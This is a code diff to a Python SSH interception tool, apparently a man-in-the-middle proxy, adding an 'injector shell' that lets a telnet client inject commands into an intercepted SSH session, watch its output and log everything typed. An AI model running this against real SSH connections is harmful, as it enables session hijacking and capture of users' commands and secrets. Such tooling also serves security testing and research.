@@ -198,6 +198,38 @@ class NoShellForwarder(SSHForwarder):
 
 class SSHInjectableForwarder(SSHForwarder):
 
+    class InjectorShell:
+
+        BUF_LEN = 1024
+
+        def __init__(self, client_sock, server_sock):
+            self.sock = client_sock
+            self.server_channel = server_sock
+            self.thread = threading.Thread(target=self.run)
+            self.thread.start()
+
+        def run(self):
+            while True:
+                buf = self.sock.recv(self.BUF_LEN)
+                if buf == b'\r\n':
+                    buf = b'\r'
+                logging.info("RECV-INJECT: " + str(buf))
+                self.server_channel.sendall(buf)
+                time.sleep(0.1)
+
+        def stdin(self, text):
+            return text
+
+        def stdout(self, text):
+            if text.startswith(b'\r\n'):
+                text = text.replace(b'\r\n', b'\r')
+            self.sock.sendall(text)
+            return text
+
+        def close(self):
+            self.sock.close()
+            self.thread.join()
+
     @classmethod
     def parser_arguments(cls):
         cls.PARSER.add_argument(
@@ -220,12 +252,13 @@ class SSHInjectableForwarder(SSHForwarder):
         self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.injector_sock.bind((self.injector_ip, self.injector_port))
         self.injector_sock.listen(5)
+        self.InjectorShell.BUF_LEN = self.BUF_LEN
 
-        self.threads = []
+        self.injector_shells = []
         thread = threading.Thread(target=self.injector_connect)
         thread.start()
-        self.threads.append(thread)
-        logging.info("creating ssh injector shell %s", self.injector_sock.getsockname())
+        self.conn_thread = thread
+        logging.info("creating ssh injector shell %s, connect with telnet", self.injector_sock.getsockname())
 
     def injector_connect(self):
         try:
@@ -234,26 +267,29 @@ class SSHInjectableForwarder(SSHForwarder):
                 if len(readable) == 1 and readable[0] is self.injector_sock:
                     client, addr = self.injector_sock.accept()
                     logging.info("injector shell opened from %s", str(addr))
-                    thread = threading.Thread(target=self.injector_session, args=(client,))
-                    thread.start()
-                    self.threads.append(thread)
+                    injector_shell = SSHInjectableForwarder.InjectorShell(client, self.server_channel)
+                    self.injector_shells.append(injector_shell)
         except Exception as e:
             logging.warning("injector shell suffered an unexpected error")
             logging.exception(e)
             self.close_session(self.channel)
 
-    def injector_session(self, client_sock):
-        with client_sock as sock:
-            while True:
-                if self.server_channel.recv_ready():
-                    buf = self.server_channel.recv(self.BUF_LEN)
-                    sock.sendall(buf)
-                data = sock.recv(self.BUF_LEN)
-                self.server_channel.sendall(data)
+    def stdin(self, text):
+        logging.info("IN: " + str(text))
+        for shell in self.injector_shells:
+            shell.stdin(text)
+        return text
+
+    def stdout(self, text):
+        logging.info("OUT: " + str(text))
+        for shell in self.injector_shells:
+            shell.stdout(text)
+        return text
 
     def close_session(self, channel):
         super().close_session(channel)
         logging.info("closing injector shell %s", self.injector_sock.getsockname())
         self.injector_sock.close()
-        for thread in self.threads:
-            thread.join()
+        self.conn_thread.join()
+        for shell in self.injector_shells:
+            shell.close()
